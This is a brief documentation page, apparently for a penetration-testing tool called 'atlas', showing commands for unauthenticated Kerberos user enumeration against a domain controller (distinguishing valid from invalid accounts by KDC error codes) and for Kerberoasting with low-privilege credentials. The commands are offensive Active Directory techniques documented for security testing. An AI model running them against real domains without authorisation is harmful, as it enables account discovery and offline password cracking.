# Kerberos User Enumeration

Enumerate valid domain users via AS-REQ.

```bash
atlas kerberos dc01.atlas.local -d ATLAS.LOCAL -UserList users.txt
```

No credentials required – classifies `KDC_ERR_PREAUTH_REQUIRED` (valid) vs `KDC_ERR_C_PRINCIPAL_UNKNOWN` (invalid).

Kerberoasting:

```bash
atlas kerberos dc01.atlas.local -d ATLAS.LOCAL -Roast -u lowpriv -p 'Password1!'
```
